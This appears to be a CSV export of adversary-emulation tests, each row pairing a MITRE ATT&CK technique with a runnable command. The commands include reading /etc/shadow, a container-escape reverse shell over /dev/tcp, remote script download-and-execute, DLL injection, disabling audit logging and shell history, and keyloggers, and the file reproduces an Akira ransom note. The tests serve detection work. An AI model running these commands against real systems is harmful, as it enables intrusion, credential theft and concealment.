T1547,Snake Malware Kernel Driver Comadmin,"$examplepath = join-path $env:windir ""system32\com""; if (-not (test-path $examplepath)) { new-item -itemtype directory -path $examplepath | out-null }; $examplename = ""comadmin.dat""; $examplefullpath = join-path $examplepath $examplename; $randombytes = new-object byte[] 0x1000; (new-object random).nextbytes($randombytes); [system.io.file]::writeallbytes($examplefullpath, $randombytes)"
T1059,AutoIt Script Execution,"start-process -filepath ""#{autoit_path}"" -argumentlist ""#{script_path}"""
T1564,Register Portable Virtualbox,"""c:\program files\oracle\virtualbox\vboxsvc.exe"" /reregserver regsvr32 /s ""c:\program files\oracle\virtualbox\vboxc.dll"" rundll32 ""c:\program files\oracle\virtualbox\vboxrt.dll,rtr3init"" sc create vboxdrv binpath= ""c:\program files\oracle\virtualbox\drivers\vboxdrv.sys"" type= kernel start= auto error= normal displayname= portablevboxdrv sc start vboxdrv"
T1564,Create and start VirtualBox virtual machine,"""#{vboxmanage_exe}"" createvm --name ""#{vm_name}"" --register ""#{vboxmanage_exe}"" modifyvm ""#{vm_name}"" --firmware efi ""#{vboxmanage_exe}"" startvm ""#{vm_name}"""
T1564,Create and start Hyper-V virtual machine,"$vm = ""#{vm_name}"" new-vm -name $vm -generation 2 set-vmfirmware $vm -enablesecureboot off start-vm $vm"
T1137,Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,"# registry setting to ""trust access to the vba project object model"" in word $registrykey = ""hkcu:software\microsoft\office\16.0\word\security"" $registryvalue = ""accessvbom"" $registrydata = ""1"" # the path where a flag text file will be created if registry setting did not already exist or if it was set to 0 $flagpath1 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag1.txt"" $flagpath2 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag2.txt"" # get the value of the key/value pair $value = (get-itemproperty -path $registrykey -name $registryvalue -erroraction silentlycontinue).$registryvalue # logical operation to: if the value of the key/value is 1, do nothing - # if the value is 0, change it to 1 and create flag1 - # if it doesn't exist, create the value and flag2 if ($value -eq ""1"") { write-host ""the registry value '$registryvalue' already exists with the required setting."" } elseif ($value -eq ""0"") { write-host ""the registry value was set to 0, temporarily changing to 1."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag1"" > $flagpath1 } else { write-host ""the registry value '$registryvalue' does not exist, temporarily creating it."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag2"" > $flagpath2 } add-type -assemblyname microsoft.office.interop.word # define the path of copied normal template for restoral $copypath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal1.dotm"" # define the path to the normal template $docpath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal.dotm"" # create copy of orginal template for restoral copy-item -path $docpath -destination $copypath -force # vba code to be insterted as a macro # will create a scheduled task to open the calculator at 8:04pm daily $vbacode = @"" sub autoexec() dim applicationpath as string dim taskname as string dim runtime as string dim schtaskscmd as string applicationpath = ""c:\windows\system32\calc.exe"" taskname = ""opencalctask"" runtime = ""20:04"" schtaskscmd = ""schtasks /create /tn """""" & taskname & """""" /tr """""" & applicationpath & """""" /sc daily /st "" & runtime & "" /f"" shell ""cmd.exe /c "" & schtaskscmd, vbnormalfocus end sub ""@ # create a new instance of word.application $word = new-object -comobject word.application # keep the word application hidden $word.visible = $false # open the document $document = $word.documents.open($docpath) # access the vba project of the document $vbaproject = $document.vbproject # add a new module to the vba project $newmodule = $vbaproject.vbcomponents.add(1) # 1 = vbext_ct_stdmodule # add the vba code to the new module $newmodule.codemodule.addfromstring($vbacode) # run the macro $word.run(""autoexec"") # save and close the document $document.saveas($docpath) $document.close() # quit word $word.quit() # release com objects [system.runtime.interopservices.marshal]::releasecomobject($document) | out-null [system.runtime.interopservices.marshal]::releasecomobject($word) | out-null [system.runtime.interopservices.marshal]::releasecomobject($vbaproject) | out-null [system.runtime.interopservices.marshal]::releasecomobject($newmodule) | out-null"
T1547,Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt,"new-itemproperty -path hklm:\system\currentcontrolset\services\ntds -name lsadbextpt -value ""#{dll_path}"""
T1055,Portable Executable Injection,"start-process ""#{exe_binary}"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1003,Access /etc/shadow (Local),sudo cat /etc/shadow > #{output_file} cat #{output_file}
T1003,Access /etc/master.passwd (Local),sudo cat /etc/master.passwd > #{output_file} cat #{output_file}
T1003,Access /etc/passwd (Local),cat /etc/passwd > #{output_file} cat #{output_file}
T1003,"Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat","unamestr=$(uname) if [ ""$unamestr"" = 'linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = 'freebsd' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi"
T1003,"Access /etc/{shadow,passwd,master.passwd} with shell builtins","testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) } [ ""$(uname)"" = 'freebsd' ] && testcat /etc/master.passwd testcat /etc/passwd testcat /etc/shadow"
T1218,CheckIfInstallable method call,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $expectedoutput = 'constructor_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs -minimumviableassembly if ($actualoutput -ne $expectedoutput) { throw @"" checkifinstallable method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1218,InstallHelper method call,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs -minimumviableassembly if ($actualoutput -ne $expectedoutput) { throw @"" installhelper method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1218,InstallUtil class constructor method call,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs -minimumviableassembly if ($actualoutput -ne $expectedoutput) { throw @"" installutil class constructor execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1218,InstallUtil Install method call,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false /installtype=notransaction /action=install `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_install_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil install method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1218,InstallUtil Uninstall method call - /U variant,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false /u `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_uninstall_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil uninstall method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1218,InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_uninstall_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil uninstall method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1218,InstallUtil HelpText method call,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/? `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_helptext_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil helptext property execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1218,InstallUtil evasive invocation,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""$env:windir\system32\tasks"" $installerassemblyfilename = 'readme.txt' $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""readme.txt"" $expectedoutput = 'constructor_' # explicitly set the directory so that a relative path to readme.txt can be supplied. set-location ""$env:windir\system32\tasks"" copy-item -path ""$([system.runtime.interopservices.runtimeenvironment]::getruntimedirectory())installutil.exe"" -destination ""$env:windir\system32\tasks\notepad.exe"" $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = 'executable' commandline = $commandline installutilpath = ""$env:windir\system32\tasks\notepad.exe"" } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs -minimumviableassembly if ($actualoutput -ne $expectedoutput) { throw @"" evasive installutil invocation test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1560,Compress Data for Exfiltration With Rar,"""#{rar_exe}"" a -r #{output_file} #{input_path}\*#{file_extension}"
T1560,Compress Data and lock with password for Exfiltration with winrar,"mkdir .\tmp\victim-files cd .\tmp\victim-files echo ""this file will be encrypted"" > .\encrypted_file.txt ""#{rar_exe}"" a -hp""blue"" hello.rar dir"
T1560,Compress Data and lock with password for Exfiltration with winzip,"path=%path%;""c:\program files (x86)\winzip"" mkdir .\tmp\victim-files cd .\tmp\victim-files echo ""this file will be encrypted"" > .\encrypted_file.txt ""#{winzip_exe}"" -min -a -s""hello"" archive.zip * dir"
T1560,Compress Data and lock with password for Exfiltration with 7zip,"mkdir $pathtoatomicsfolder\t1560.001\victim-files cd $pathtoatomicsfolder\t1560.001\victim-files echo ""this file will be encrypted"" > .\encrypted_file.txt ""#{7zip_exe}"" u archive.7z *txt -pblue dir"
T1560,Data Compressed - nix - zip,zip #{output_file} #{input_files}
T1560,Data Compressed - nix - gzip Single File,test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})
T1560,Data Compressed - nix - tar Folder or File,tar -cvzf #{output_file} #{input_file_folder}
T1560,Data Encrypted with zip and gpg symmetric,"mkdir -p #{test_folder} cd #{test_folder}; touch a b c d e f g zip --password ""#{encryption_password}"" #{test_folder}/#{test_file} ./* echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip ls -l #{test_folder}"
T1560,Encrypts collected data with AES-256 and Base64,zip -r #{input_folder}/#{input_file}.zip #{input_folder} openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc cat #{input_folder}/#{input_file}.enc | base64
T1560,ESXi - Remove Syslog remote IP,"# extract line with ip address from the syslog configuration output #{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m pathtoatomicsfolder\..\atomics\t1560.001\src\esxi_get_loghost.txt | findstr /r ""[0-9]*\.[0-9]*\.[0-9]*\."" > c:\temp\loghost.txt # replace the ip with ""0"" #{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m pathtoatomicsfolder\..\atomics\t1560.001\src\esxi_remove_loghost.txt # extract the ip from the line extracted from findstr $inputfilepath = ""c:\temp\loghost.txt"" $outputfilepath = ""c:\temp\loghost_ip.txt"" $filecontent = get-content -path $inputfilepath -raw if ([string]::isnullorwhitespace($filecontent)) { write-host ""the content is $filecontent"" write-host ""the file is empty"" } else { # use a regular expression to extract ip addresses $ipaddresses = [regex]::matches($filecontent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').value $output = ""esxcli system syslog config set --loghost="" + $ipaddresses $output | out-file -filepath $outputfilepath -encoding ascii write-host ""ip addresses extracted and saved to $outputfilepath"" }"
T1560,Compress a File for Exfiltration using Makecab,makecab.exe #{input_file} #{output_file}
T1560,Copy and Compress AppData Folder,"$appdata=""$env:userprofile\appdata"" $copy=""#{destination_folder}"" $zip=""#{zip_file_path}"" if (test-path $copy) { remove-item $copy -recurse -force } new-item -itemtype directory -path $copy | out-null get-childitem $appdata -recurse -force | foreach-object { $rel = $_.fullname.substring($appdata.length + 1) $dest = join-path $copy $rel if ($_.psiscontainer) { new-item -itemtype directory -path $dest -force | out-null } else { copy-item $_.fullname -destination $dest -force -erroraction silentlycontinue } } add-type -assemblyname system.io.compression.filesystem [system.io.compression.zipfile]::createfromdirectory($copy, $zip, [system.io.compression.compressionlevel]::optimal, $false)"
T1611,Deploy container using nsenter container escape,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=/proc/1/ns/mnt"",""--"",""/bin/bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'"
T1611,Mount host filesystem to escape privileged Docker container,"if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi echo -n ""* * * * * root /bin/bash -c '/bin/bash -c echo \""\""; echo \""hello from host! "" > #{mount_point}#{cron_path}/#{cron_filename} echo -n ""$"" >> #{mount_point}#{cron_path}/#{cron_filename} echo -n ""(hostname) "" >> #{mount_point}#{cron_path}/#{cron_filename} echo -n ""$"" >> #{mount_point}#{cron_path}/#{cron_filename} echo ""(id)\"" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'"" >> #{mount_point}#{cron_path}/#{cron_filename} netcat -l -p #{listen_port} 2>&1"
T1611,Privilege Escalation via Docker Volume Mapping,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"""
T1562,Disable history collection,export histcontrol=ignoreboth #{evil_command}
T1562,Disable history collection (freebsd),export histsize=0 #{evil_command}
T1562,Clear bash history,"cp $histfile $histfile.old if ((${#histfile[@]})); then echo $histfile; fi echo """" > $histfile if [ $(wc -c <$histfile) -gt 1 ]; then echo ""$histfile is larger than 1k""; fi ls -la $histfile cat $histfile history -c if [ $(history |wc -l) -eq 1 ]; then echo ""history cache cleared""; fi"
T1562,Setting the HISTCONTROL environment variable,"test=$(echo $histcontrol) if [ ""$histcontrol"" != ""ignoreboth"" ]; then export histcontrol=""ignoreboth""; fi history -c ls -la $histfile # "" ls -la $histfile"" if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi if [ ""$histcontrol"" != ""erasedups"" ]; then export histcontrol=""erasedups""; fi history -c ls -la $histfile ls -la $histfile ls -la $histfile if [ $(history |wc -l) -eq 2 ]; then echo ""their is only one entry for ls -la $histfile""; fi"
T1562,Setting the HISTFILESIZE environment variable,"test=$(echo $histfilesize) echo $histfilesize export histfilesize=0 echo ""runnning some commands to populate the history"" whoami groups if [ $(echo $histfilesize) -eq 0 ]; then echo ""\$histfilesize is zero""; else hist_lenght=$(wc -l $histfile); echo ""\$histfilesize is not zero, history lenght is $hist_lenght""; fi"
T1562,Setting the HISTSIZE environment variable,"echo $histsize export histsize=0 echo ""runnning some commands to populate the history"" whoami groups if [ $(echo $histsize) -eq 0 ]; then echo ""\$histsize is zero""; else hist_length=$(wc -l $histfile); echo ""\$histsize is not zero, history size is $hist_length""; fi"
T1562,Setting the HISTFILE environment variable,"test=$(echo $histfile) echo $histfile export histfile=""/dev/null"" echo ""runnning some commands to populate the history"" whoami groups if [ $(echo $histfile) == ""/dev/null"" ]; then echo ""\$histfile is /dev/null""; else hist_lenght=$(wc -l $histfile); echo ""\$histfile is not /dev/null, history lenght is $hist_lenght""; fi"
T1562,Setting the HISTFILE environment variable (freebsd),"echo $histfile export histfile=""/dev/null"" if [ $(echo $histfile) == ""/dev/null"" ]; then echo ""\$histfile is /dev/null""; fi"
T1562,Setting the HISTIGNORE environment variable,"if ((${#histignore[@]})); then echo ""\$histignore = $histignore""; else export histignore='ls*:rm*:ssh*'; echo ""\$histignore = $histignore""; fi history -c ls -la $histfile ls -la ~/.bash_logout if [ $(history |wc -l) -eq 1 ]; then echo ""ls commands are not in history""; fi unset histignore if ((${#histignore[@]})); then echo ""\$histignore = $histignore""; else export histignore='*'; echo ""\$histignore = $histignore""; fi history -c whoami groups if [ $(history |wc -l) -eq 0 ]; then echo ""history cache is empty""; fi"
T1562,Disable Windows Command Line Auditing using reg.exe,reg add hklm\software\microsoft\windows\currentversion\policies\system\audit /v processcreationincludecmdline_enabled /t reg_dword /d 0 /f
T1562,Disable Windows Command Line Auditing using Powershell Cmdlet,"new-itemproperty -path ""hklm:software\microsoft\windows\currentversion\policies\system\audit"" -name ""processcreationincludecmdline_enabled"" -value 0 -propertytype dword -force -erroraction ignore"
T1055,Process Injection via Extra Window Memory (EWM) x64 executable,#{exe_binary}
T1055,Process Injection via mavinject.exe,"$mypid = #{process_id} mavinject $mypid /injectrunning ""#{dll_payload}"" stop-process -processname notepad"
T1055,WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/usodll/get-usoclientdllsystem.ps1')
T1074,Stage data from Discovery.bat,"invoke-webrequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.bat"" -outfile #{output_file}"
T1074,Stage data from Discovery.sh,curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.sh | sh -s > #{output_file}
T1074,Zip a Folder with PowerShell for Staging in Temp,"compress-archive -path ""#{input_file}"" -destinationpath #{output_file} -force"
T1218,mavinject - Inject DLL into running process,"mavinject.exe #{process_id} /injectrunning ""#{dll_payload}"""
T1218,Register-CimProvider - Execute evil dll,"c:\windows\syswow64\register-cimprovider.exe -path ""#{dll_payload}"""
T1218,InfDefaultInstall.exe .inf Execution,"infdefaultinstall.exe ""#{inf_to_execute}"""
T1218,ProtocolHandler.exe Downloaded a Suspicious File,"for /f ""tokens=2*"" %a in ('reg query ""hklm\software\microsoft\windows\currentversion\app paths\winword.exe"" /v path') do set microsoft_wordpath=%b call ""%microsoft_wordpath%\protocolhandler.exe"" ""ms-word:nft|u|#{remote_url}"""
T1218,Microsoft.Workflow.Compiler.exe Payload Execution,"#{mwcpath}\#{mwcname} ""#{xml_payload}"" output.txt"
T1218,Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"&""#{renamed_binary}"" ""#{xml_payload}"" output.txt"
T1218,Invoke-ATHRemoteFXvGPUDisablementCommand base test,invoke-athremotefxvgpudisablementcommand -modulename #{module_name} -modulepath #{module_path}
T1218,DiskShadow Command Execution,#{dspath} -s #{txt_payload}
T1218,Load Arbitrary DLL via Wuauclt (Windows Update Client),"wuauclt.exe /updatedeploymentprovider ""#{arbitrary_dll}"" /runhandlercomserver"
T1218,Lolbin Gpscript logon option,gpscript /logon
T1218,Lolbin Gpscript startup option,gpscript /startup
T1218,Lolbas ie4uinit.exe use as proxy,"copy #{path_ie4uinit} %temp%\ie4uinit.exe copy ""#{path_inf}"" %temp%\ieuinit.inf %temp%\ie4uinit.exe -basesettings"
T1218,LOLBAS CustomShellHost to Spawn Process,"if (-not (test-path #{dest_path})) { new-item -path #{dest_path} -itemtype directory } else { write-host ""directory #{dest_path} already exists."" } copy-item -path ""c:\windows\system32\customshellhost.exe"" -destination ""#{dest_path}\customshellhost.exe"" -force copy-item -path ""c:\windows\system32\calc.exe"" -destination ""#{dest_path}\explorer.exe"" -force #{dest_path}\customshellhost.exe"
T1218,Provlaunch.exe Executes Arbitrary Command via Registry Key,reg.exe add hklm\software\microsoft\provisioning\commands\lolbin\dummy1 /v altitude /t reg_dword /d 0 reg add hklm\software\microsoft\provisioning\commands\lolbin\dummy1\dummy2 /v commandline /d calc.exe c:\windows\system32\provlaunch.exe lolbin
T1218,LOLBAS Msedge to Spawn Process,"$edgepath64 = ""c:\program files\microsoft\edge\application\msedge.exe"" if (test-path $edgepath64) { $edgepath = $edgepath64 } else { # check 32-bit edge installation path $edgepath32 = ""c:\program files (x86)\microsoft\edge\application\msedge.exe"" if (test-path $edgepath32) { $edgepath = $edgepath32 } else { exit 1 } } & $edgepath --disable-gpu-sandbox --gpu-launcher=""c:\\windows\\system32\\calc.exe &&"" sleep 5 taskkill -f -im msedge.exe taskkill -f -im calc.exe taskkill -f -im win32calc.exe"
T1218,System Binary Proxy Execution - Wlrmdr Lolbin,"wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u ""#{payload_path}"""
T1609,ExecIntoContainer,kubectl create -f #{path} -n #{namespace} # wait 3 seconds for the instance to come up sleep 3 kubectl exec -n #{namespace} busybox -- #{command}
T1609,Docker Exec Into Container,"docker build -t t1609 $pathtoatomicsfolder/t1609/src/ docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh docker exec -i t1609_container bash -c ""cat /tmp/output.txt"""
T1021,RDP to DomainController,"$server=#{logonserver} $user = join-path #{domain} #{username} $password=""#{password}"" cmdkey /generic:termsrv/$server /user:$user /pass:$password mstsc /v:$server echo ""rdp connection established"""
T1021,Changing RDP Port to Non Standard Port via Powershell,"set-itemproperty -path 'hklm:\system\currentcontrolset\control\terminal server\winstations\rdp-tcp' -name ""portnumber"" -value #{new_remote_port} new-netfirewallrule -displayname 'rdpportlatest-tcp-in' -profile 'public' -direction inbound -action allow -protocol tcp -localport #{new_remote_port}"
T1021,Changing RDP Port to Non Standard Port via Command_Prompt,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v portnumber /t reg_dword /d #{new_remote_port} /f netsh advfirewall firewall add rule name=""rdpportlatest-tcp-in"" dir=in action=allow protocol=tcp localport=#{new_remote_port}"
T1021,Disable NLA for RDP via Command Prompt,"reg add ""hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v userauthentication /d 0 /t reg_dword /f"
T1056,Input Capture,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath #{filepath}"
T1056,Living off the land Terminal Input Capture on Linux with pam.d,"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/system-auth"
T1056,Logging bash history to syslog,"prompt_command='history -a >(tee -a ~/.bash_history |logger -t ""$user[$$] $ssh_connection "")' echo ""\$prompt_command=$prompt_command"" tail /var/log/syslog"
T1056,Logging sh history to syslog/messages,"ps2=`logger -t ""$user"" -f ~/.sh_history` $ps2 tail /var/log/messages"
T1056,Bash session based keylogger,"trap 'echo ""$(date +""%d/%m/%y %h:%m:%s.%s"") $user $bash_command"" >> #{output_file}' debug echo ""hello world!"" cat #{output_file}"
T1056,SSHD PAM keylogger,"cp -v /etc/pam.d/sshd /tmp/ echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> /etc/pam.d/sshd systemctl restart sshd systemctl restart auditd ssh #{user_account}@localhost whoami sudo su whoami exit exit"
T1056,Auditd keylogger,"auditctl -a always,exit -f arch=b64 -s execve -k cmds auditctl -a always,exit -f arch=b32 -s execve -k cmds whoami; ausearch -i --start now"
T1056,MacOS Swift Keylogger,swift #{swift_src} -keylog
T1486,Encrypt files using gpg (FreeBSD/Linux),"echo ""#{pwd_for_encrypted_file}"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}"
T1486,Encrypt files using 7z (FreeBSD/Linux),$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
T1486,Encrypt files using ccrypt (FreeBSD/Linux),which_ccencrypt=`which ccencrypt` cp #{root_input_file_path} #{cped_file_path}; $which_ccencrypt -t -k #{pwd_for_encrypted_file} #{cped_file_path}
T1486,Encrypt files using openssl (FreeBSD/Linux),which_openssl=`which openssl` $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size} $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path} $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
T1486,PureLocker Ransom Note,echo t1486 - purelocker ransom note > %userprofile%\desktop\your_files.txt
T1486,Encrypt files using 7z utility - macOS,7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}
T1486,Encrypt files using openssl utility - macOS,openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}
T1486,Data Encrypted with GPG4Win,"set-content -path ""#{file_to_encrypt_location}"" -value ""populating this file with some text"" # create the test.txt file again in case prereqs failed cmd /c ""`""c:\program files (x86)\gnupg\bin\gpg.exe`"" --passphrase 'someparaphraseblah' --batch --yes -c `""#{file_to_encrypt_location}`"""""
T1486,Data Encrypt Using DiskCryptor,"""""%programfiles%\dcrypt""\#{dcrypt_exe}"""
T1486,Akira Ransomware drop Files with .akira Extension and Ransomnote,"1..100 | foreach-object { $out = new-object byte[] 1073741; (new-object random).nextbytes($out); [io.file]::writeallbytes(""c:\test.$_.akira"", $out) } echo ""hi friends"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. moreover, we have taken a great amount of your corporate data prior to encryption well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. we're fully aware of what damage we caused by locking your internal sources. at the moment. you have to know: "" >> $env:userprofile\desktop\akira_readme.txt echo ""1. dealing with us you will save a lot due to we are not interested in ruining your financially. we will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. if you have an active cyber insurance, let us know and we will guide you how to properly use it. also, dragging out the negotiation process will lead to failing of a deal"" >> $env:userprofile\desktop\akira_readme.txt echo ""2. paying us you save your time, money, efforts and be back on track within 24 hours approximately. our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them  in this case we won't be able to help. "" >> $env:userprofile\desktop\akira_readme.txt echo ""3. the security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since no full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data."" >> $env:userprofile\desktop\akira_readme.txt echo ""4. as for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes  generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones."" >> $env:userprofile\desktop\akira_readme.txt echo ""then all of this will be published in our blog -"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""https://akira.onion"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""5. we're more than 